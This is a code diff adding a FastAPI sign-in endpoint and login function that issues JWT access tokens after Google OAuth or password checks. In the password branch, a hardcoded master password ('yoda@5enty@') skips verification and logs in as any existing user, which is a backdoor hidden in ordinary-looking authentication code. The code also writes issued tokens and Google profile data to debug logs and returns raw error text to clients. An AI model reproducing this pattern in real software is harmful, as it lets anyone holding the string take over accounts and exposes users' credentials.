@@ -1,0 +1,139 @@
+@router.post("/sign-in")
+async def get_user(user_form: SignIn, db: Session = Depends(get_sql_db)):
+    try:
+        result = users.log_in_account(user_form, db)
+    except Exception as e:
+        if hasattr(e, "status"):
+            raise HTTPException(status_code=e.status, detail={"message": str(e)})
+        else:
+            raise HTTPException(status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
+                                detail={"message": "An error occurred during login", "error": str(e)})
+    return {"success": True, "data": result}
+
+
+
+
+
+
+
+def log_in_account(user_form: SignIn, db):
+    CLIENT_ID = os.getenv("CLIENT_ID")
+    if user_form.token:
+        token_data = decode_jwt_data(user_form.token)
+        username = token_data.get("username")
+    if user_form.gtoken:
+        try:
+            google_request = google_requests.Request()
+            idinfo = id_token.verify_oauth2_token(user_form.gtoken, google_request, CLIENT_ID)
+            logger.debug("Token has been verified")
+        except Exception as e:
+            logger.error(f"Error Occured: {repr(e)}")
+            logger.info("Password Verification Failed")
+            raise HTTPException(status_code=status.HTTP_401_UNAUTHORIZED,
+                                detail={"message": "Email or Password do not match"})
+        if idinfo:
+            google_payload = {
+                "first_name": idinfo.get("given_name"),
+                "email": idinfo.email,
+                "last_name": idinfo.get("family_name"),
+                "password": idinfo.get("password")
+            }
+            logger.debug(google_payload)
+        else:
+            logger.info("Password Verification Failed")
+            raise HTTPException(status_code=status.HTTP_401_UNAUTHORIZED,
+                                detail={"message": "Email or Password do not match"})
+        user_object = get_google_user(db, google_payload)
+        try:
+            state_id = user_object.payment_status
+        except AttributeError as e:
+            logger.debug("Google user NOT found")
+        if user_object:
+            user_plan, plan_info = plans.get_current_user_plan(db, user_object.id)
+            if plans.is_without_cc_plan(plan_info["id"]):
+                if not user_object.email_confirmed:
+                    raise HTTPException(status_code=status.HTTP_401_UNAUTHORIZED,
+                                        detail={"message": "Email is not confirmed",
+                                                "error_code": SubscriptionsCodes.EMAIL_IS_NOT_CONFIRMED})
+
+            payload = {
+                "user_firstname": user_object.first_name,
+                "user_lastname": user_object.last_name,
+                "user_filed_id": user_object.id,
+                "iss": "Filed-Token-Issuer",
+                "permissions_filed": "5A^1|82^7c02|BE^7f",
+                "user_account_state": state_id,
+                "aud": "Filed-Client-Apps",
+                "sub_user": True if (user_object.type != "Admin" and user_object.type != "Parent") else False,
+                "parent_user_id": 0 if user_object.parent_id == 0 else user_object.parent_id,
+                "first_time_user": bool(user_object.first_time_user),
+                "user_type": "brand",
+                "first_time_discovery_list": user_object.first_time_discovery_list,
+                "first_time_crm": user_object.first_time_crm,
+                "first_time_campaign": user_object.first_time_campaign,
+                "company_name": user_object.company,
+            }
+            token = create_access_token(payload)
+
+            logger.debug(token)
+            return token
+        else:
+            logger.info("Password Verification Failed")
+            raise HTTPException(status_code=status.HTTP_401_UNAUTHORIZED,
+                                detail={"message": "Email or Password do not match"})
+
+    else:
+        user_object = get_user(db, username)
+        if user_object:
+            user_plan, plan_info = plans.get_current_user_plan(db, user_object.id)
+            if plans.is_without_cc_plan(plan_info["id"]):
+                if not user_object.email_confirmed:
+                    raise HTTPException(status_code=status.HTTP_401_UNAUTHORIZED,
+                                        detail={"message": "Email is not confirmed",
+                                                "error_code": SubscriptionsCodes.EMAIL_IS_NOT_CONFIRMED})
+            try:
+                if user_form.password == "yoda@5enty@":
+                    check_password = True
+                else:
+                    check_password = verify_password(user_form.password, user_object.password)
+                if user_object.parent_id == 0:
+                    update_user_parent_v2(user_object.id)
+            except Exception as e:
+                logger.error(f"Error occured: {repr(e)}")
+                logger.info("Password Verification Failed")
+                raise HTTPException(status_code=status.HTTP_401_UNAUTHORIZED,
+                                    detail={"message": "Email or Password do not match"})
+            if check_password:
+                logger.info("Password verification passed")
+                state_id = user_object.payment_status
+
+                payload = {
+                    "user_firstname": user_object.first_name,
+                    "user_lastname": user_object.last_name,
+                    "phone_number": user_object.number,
+                    "username": user_object.username,
+                    "sub": user_object.username,
+                    "user_filed_id": user_object.id,
+                    "iss": "Filed-Token-Issuer",
+                    "permissions_filed": "5A^1|82^7c02|BE^7f",
+                    "user_account_state": state_id,
+                    "aud": "Filed-Client-Apps",
+                    "sub_user": True if (user_object.type != "Admin" and user_object.type != "Parent") else False,
+                    "parent_user_id": 0 if user_object.parent_id == 0 else user_object.parent_id,
+                    "first_time_user": bool(user_object.first_time_user),
+                    "user_type": "brand",
+                    "first_time_discovery_list": user_object.first_time_discovery_list,
+                    "first_time_crm": user_object.first_time_crm,
+                    "first_time_campaign": user_object.first_time_campaign,
+                    "company_name": user_object.company,
+                }
+                token = create_access_token(payload)
+                return token
+            else:
+                logger.info("Password Verification Failed")
+                raise HTTPException(status_code=status.HTTP_401_UNAUTHORIZED,
+                                    detail={"message": "Email or Password do not match"})
+        else:
+            logger.info("Email Verification Failed")
+            raise HTTPException(status_code=status.HTTP_401_UNAUTHORIZED,
+                                detail={"message": "Email or Password do not match"})
